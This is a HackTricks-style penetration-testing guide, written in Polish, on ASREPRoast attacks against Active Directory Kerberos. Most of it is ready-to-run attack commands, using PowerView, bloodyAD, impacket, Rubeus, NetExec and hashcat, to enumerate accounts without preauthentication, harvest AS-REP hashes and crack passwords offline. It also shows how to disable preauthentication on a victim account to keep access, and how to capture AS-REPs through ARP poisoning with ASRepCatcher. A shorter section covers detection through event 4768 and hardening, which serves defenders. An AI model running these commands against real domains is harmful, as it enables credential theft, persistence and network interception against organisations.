# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast to atak na bezpieczeństwo, który wykorzystuje użytkowników pozbawionych atrybutu **Kerberos pre-authentication required**. Zasadniczo ta luka umożliwia atakującym żądanie uwierzytelnienia użytkownika z kontrolera domeny (DC) bez konieczności posiadania hasła użytkownika. Następnie DC odpowiada wiadomością zaszyfrowaną kluczem uzyskanym z hasła użytkownika, którą atakujący mogą próbować złamać offline w celu odkrycia hasła użytkownika.

Główne wymagania tego ataku to:

- **Brak Kerberos pre-authentication**: Docelowi użytkownicy nie mogą mieć włączonej tej funkcji zabezpieczeń.
- **Połączenie z kontrolerem domeny (DC)**: Atakujący muszą mieć dostęp do DC, aby wysyłać żądania i odbierać zaszyfrowane wiadomości.
- **Opcjonalne konto domenowe**: Posiadanie konta domenowego pozwala atakującym skuteczniej identyfikować podatnych użytkowników za pomocą zapytań LDAP. Bez takiego konta atakujący muszą zgadywać nazwy użytkowników.

#### Enumerowanie podatnych użytkowników (wymagane dane uwierzytelniające domeny)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Żądanie wiadomości AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus domyślnie żąda **RC4**, dlatego Event ID **4768** zwykle pokazuje **preauth type 0** oraz **ticket encryption type 0x17**. Jeśli dodasz **`/aes`** (lub RC4 jest wyłączone dla celu), oczekuj etype **AES**.<sup>[[2]](#references)</sup>

#### Szybkie one-linery (Linux)

- Najpierw enumeruj potencjalne cele (np. na podstawie leaked build paths) za pomocą Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Wykonaj Roast całej listy nazw użytkowników bez prawidłowych creds za pomocą NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Jeśli masz creds, pozwól NetExec odpytać LDAP i zażądać za Ciebie każdego konta kwalifikującego się do Roasta: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Jeśli wynik zaczyna się od **`$krb5asrep$23$`**, złam go za pomocą Hashcat **`-m 18200`**. Jeśli zaczyna się od **`$krb5asrep$17$`** lub **`$krb5asrep$18$`**, preferuj John z opcją **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Nie zakładaj, że każdy AS-REP roast używa RC4. Współczesne narzędzia mogą zwracać **RC4** (`$krb5asrep$23$`) lub **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) w zależności od żądanego/wynegocjowanego enctype. **`hashcat -m 18200`** służy do **etype 23**, natomiast **John** obsługuje `krb5asrep` bezpośrednio dla **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Utrzymanie dostępu

Wymuś wyłączenie **preauth** dla użytkownika, w przypadku którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisu właściwości):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Wykrywanie i hardening

Udany roast generuje zdarzenie **4768** na DC z `Status=0x0` i `PreAuthType=0`. Nie wymagaj RC4 podczas wykrywania: `TicketEncryptionType=0x17` jest użytecznym sygnałem słabego szyfrowania, ale attacker może zażądać AES (wartości w logu zdarzeń `0x11`/`0x12`). W systemie Windows Server 2016 i nowszych, z aktualizacją zbiorczą z 14 stycznia 2025 r. (lub nowszą), wersja 2 zdarzenia 4768 udostępnia również `ClientAdvertizedEncryptionTypes`, obsługiwane przez konto/DC etypes oraz dostępne klucze.<sup>[[5]](#references)</sup>

Praktyczne polowanie polega na wykrywaniu klienta reklamującego wyłącznie RC4, gdy konto ma klucze AES, a następnie korelowaniu serii żądań z jednego źródłowego adresu IP dotyczących kilku użytkowników bez preauth. Ustal baseline legalnych wyjątków zamiast generować alert dla każdego zdarzenia z `PreAuthType=0`.

Trwała naprawa polega na wyłączeniu opcji **Do not require Kerberos preauthentication** dla każdego użytkownika, który bezwzględnie jej nie potrzebuje, oraz na rotacji ujawnionych haseł kont. Jeśli nie można usunąć wyjątku, użyj długiego, losowo wygenerowanego hasła i przydziel minimalne uprawnienia. Wyłączenie RC4 zwiększa koszt crackingu, ale nie usuwa podatności na roast, ponieważ odpowiedzi AES AS-REP nadal można crackować offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast bez poświadczeń

Attacker działający on-path może przechwycić AS-REP zwrócony podczas zwykłej, uwierzytelnionej wstępnie wymiany AS i sformatować jego zaszyfrowaną część do crackingu offline. W przeciwieństwie do klasycznego ASREPRoasting nie wymaga to `DONT_REQ_PREAUTH`; jednak uzyskiwane są wyłącznie konta, których wymiana Kerberos została faktycznie przechwycona. **ASRepCatcher** domyślnie uzyskuje pozycję za pomocą jednokierunkowego ARP poisoning albo może odbierać ruch z użyciem innej techniki MitM z opcją `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Jeśli interesuje Cię powiązany trick bez poświadczeń, który zwraca **service ticket** zamiast **TGT** z principalu bez preauth, zobacz [Kerberoast](kerberoast.md).

W trybie `relay` narzędzie [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) przekazuje przechwycone AS-REQ i wymusza **RC4**, gdy obie strony nadal na to pozwalają. `listen` nie modyfikuje pakietów, dlatego przechwytuje enctype wynegocjowany przez klienta i DC. W miarę możliwości ogranicz zakres poisoning za pomocą `-t`/`-tf`, zamiast obejmować nim całą podsieć.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Zażądano biletu uwierzytelniania Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
